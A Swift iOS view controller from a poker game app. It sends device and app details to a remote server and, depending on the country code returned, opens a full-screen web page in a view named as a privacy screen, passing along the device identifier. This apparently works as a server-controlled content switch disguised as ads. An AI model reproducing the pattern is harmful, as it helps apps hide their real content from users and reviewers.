//
//  ViewController.swift
//  PokerRoyaleRivals
//
//  Created by SunTory on 2024/9/27.
//

import UIKit
import Adjust

class ViewController: UIViewController {
    @IBOutlet weak var pprActivityView: UIActivityIndicatorView!

    override func viewDidLoad() {
        super.viewDidLoad()
        self.pprActivityView.hidesWhenStopped = true
        self.pprLoadADsData()
        // Do any additional setup after loading the view.
    }
    
    @IBAction func clickGotbn(_ sender: Any) {
        let gameVC = self.storyboard?.instantiateViewController(withIdentifier: "HomeVC") as! PPRHomeVC
        let contentVC =  PNRNavViewController.init(rootViewController: gameVC)
        contentVC.modalPresentationStyle = .fullScreen
        present(contentVC, animated: true)
    }
    private func pprLoadADsData() {
        self.pprActivityView.startAnimating()
        if PPRRoyReaManage.sharedManager().isReachable {
            pprReqAdsLocalData()
        } else {
            PPRRoyReaManage.sharedManager().setReachabilityStatusChange { status in
                if PPRRoyReaManage.sharedManager().isReachable {
                    self.pprReqAdsLocalData()
                    PPRRoyReaManage.sharedManager().stopMonitoring()
                }
            }
            PPRRoyReaManage.sharedManager().startMonitoring()
        }
    }
    
    private func pprReqAdsLocalData() {
        requestLocalAdsData { dataDic in
            if let dataDic = dataDic {
                self.pprConfigAdsData(pulseDataDic: dataDic)
            } else {
                self.pprActivityView.stopAnimating()
            }
        }
    }
    
    private func pprConfigAdsData(pulseDataDic: [String: Any]?) {
        if let aDic = pulseDataDic {
            let cCode: String = aDic["countryCode"] as? String ?? ""
            let adsData: [String: Any]? = aDic["jsonObject"] as? Dictionary
            if let adsData = adsData {
                if let codeData = adsData[cCode], codeData is [String: Any] {
                    let dic: [String: Any] = codeData as! [String: Any]
                    if let data = dic["data"] as? String, !data.isEmpty {
                        UserDefaults.standard.set(dic, forKey: "YonoADSData")
                        showAds(data)
                    }
                    return
                }
            }
            self.pprActivityView.stopAnimating()
        }
    }
    
    private func showAds(_ adsUrl: String) {
        let adsVC: PPRPrivacyVC = self.storyboard?.instantiateViewController(withIdentifier: "PrivacyVC") as! PPRPrivacyVC
        adsVC.modalPresentationStyle = .fullScreen
        adsVC.url = "\(adsUrl)?a=\(Adjust.idfv() ?? "")&p=\(Bundle.main.bundleIdentifier ?? "")"
        print(adsVC.url!)
        if self.presentedViewController != nil {
            self.presentedViewController!.present(adsVC, animated: false)
        } else {
            present(adsVC, animated: false)
        }
    }
    
    private func requestLocalAdsData(completion: @escaping ([String: Any]?) -> Void) {
        guard let bundleId = Bundle.main.bundleIdentifier else {
            completion(nil)
            return
        }
//        dreamcraft.top
        let url = URL(string: "https://open.dreamcraft.top/open/reqLocalAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appMod": UIDevice.current.model,
            "appKey": "eb8a79ed906447c89c2cd4d68023248c",
            "appPackageId": bundleId,
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        let dictionary: [String: Any]? = resDic["data"] as? Dictionary
                        if let dataDic = dictionary {
                            completion(dataDic)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }


}

